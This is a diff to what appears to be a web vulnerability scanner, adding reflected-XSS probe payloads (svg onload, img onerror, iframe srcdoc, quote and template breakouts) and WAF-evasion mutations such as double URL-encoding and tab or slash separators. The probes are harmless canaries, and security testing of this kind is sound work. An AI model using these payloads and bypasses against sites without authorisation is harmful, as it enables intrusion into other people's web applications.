@@ -75,11 +75,44 @@ ATTR_MARK = '"'           # a bare double-quote surviving raw = attribute breako
 # attribute-quote followed by a benign tag. The others are payloads tuned to
 # a specific reflection context that the v3.5 sink-context detector labels.
 PAYLOAD_VARIANTS = {
+    # v3.10 base five: attribute breakout + close-tag families.
     "body":            ('"<dXsS>',                '<dXsS>'),
     "title-breakout":  ('</title><dXsS>',         '</title><dXsS>'),
     "attr-breakout":   ('"><dXsS>',               '"><dXsS>'),
     "script-breakout": ("';<dXsS>//",             '<dXsS>'),
     "url-scheme":      ('javascript:/*<dXsS>*/',  'javascript:/*<dXsS>*/'),
+
+    # Phase 1.2 additions: event-handler tags (the most common real-world
+    # XSS execution vectors). Each is a fully-formed HTML tag that runs an
+    # attribute handler in a browser. The marker embeds the tag so the
+    # verdict fires only if the tag itself survived raw, not just the
+    # `<dXsS>` grep-marker after it. All names end in `-breakout` so
+    # _apply_ct_gate upgrades severity to executable when unencoded.
+    "svg-breakout":            ('"><svg onload=1><dXsS>',
+                                '<svg onload=1><dXsS>'),
+    "img-breakout":            ('"><img src=x onerror=1><dXsS>',
+                                '<img src=x onerror=1><dXsS>'),
+    "body-onload-breakout":    ('"><body onload=1><dXsS>',
+                                '<body onload=1><dXsS>'),
+    "details-toggle-breakout": ('"><details open ontoggle=1><dXsS>',
+                                '<details open ontoggle=1><dXsS>'),
+    "input-autofocus-breakout":('"><input autofocus onfocus=1><dXsS>',
+                                '<input autofocus onfocus=1><dXsS>'),
+
+    # Modern-HTML5 sanitizer bypass surfaces.
+    "iframe-srcdoc-breakout":  ('"><iframe srcdoc="<dXsS>">',
+                                '<iframe srcdoc="<dXsS>"'),
+    "video-source-breakout":   ('"><video><source onerror=1></video><dXsS>',
+                                '<video><source onerror=1></video><dXsS>'),
+
+    # Alternative quote-style breakouts (many templates use single quotes,
+    # some frameworks use backticks in attribute values).
+    "attr-squote-breakout":    ("'><dXsS>",              "'><dXsS>"),
+    "attr-backtick-breakout":  ('`><dXsS>',              '`><dXsS>'),
+
+    # JS/template contexts.
+    "template-literal-breakout": ('${(1)}<dXsS>',        '${(1)}<dXsS>'),
+    "html-comment-breakout":     ('--><dXsS>',           '--><dXsS>'),
 }
 
 
@@ -88,12 +121,33 @@ PAYLOAD_VARIANTS = {
 # the base payload is blocked by a regex WAF (rules that match <dXsS> or
 # <script literal etc.), one of these variants may still slip through by
 # obfuscating the parts the WAF pattern anchored on.
+#
+# Every mutation must produce a shape that (a) a lenient HTML parser
+# re-forms into the intended tag and (b) transforms both the sent canary
+# and the verdict marker identically, so verdict() still finds it in the
+# response body.
 _WAF_MUTATIONS = [
     # (name, marker_transform) -- both sides get the same replacement
-    ("case",       lambda s: s.replace('<dXsS>', '<DxSs>')),
-    ("split-cmt",  lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
-    ("whitespace", lambda s: s.replace('<dXsS>', '<dXsS  >')),
-    ("url-encode", lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),
+    # v3.10 originals:
+    ("case",              lambda s: s.replace('<dXsS>', '<DxSs>')),
+    ("split-cmt",         lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
+    ("whitespace",        lambda s: s.replace('<dXsS>', '<dXsS  >')),
+    ("url-encode",        lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),
+
+    # Phase 1.2 additions:
+    # HTML5 permits tab/newline as whitespace inside a tag; many regex WAFs
+    # look only for `<[A-Za-z]+ ` (space) after the tag name.
+    ("tab-in-tag",        lambda s: s.replace('<dXsS>', '<dXsS\t>')),
+    ("newline-in-tag",    lambda s: s.replace('<dXsS>', '<dXsS\n>')),
+
+    # `<tag/attr=…>` is valid HTML5 — the slash is legal whitespace-like
+    # separator. Slips regex WAFs anchored on space.
+    ("slash-separator",   lambda s: s.replace('<dXsS>', '<dXsS/>')),
+
+    # Double URL-encode. If the intermediary decodes once and the backend
+    # decodes once, we land back to `<dXsS>` on final render. WAFs that
+    # only decode once still see `%253C`.
+    ("double-url-encode", lambda s: s.replace('<dXsS>', '%253CdXsS%253E')),
 ]
 
 
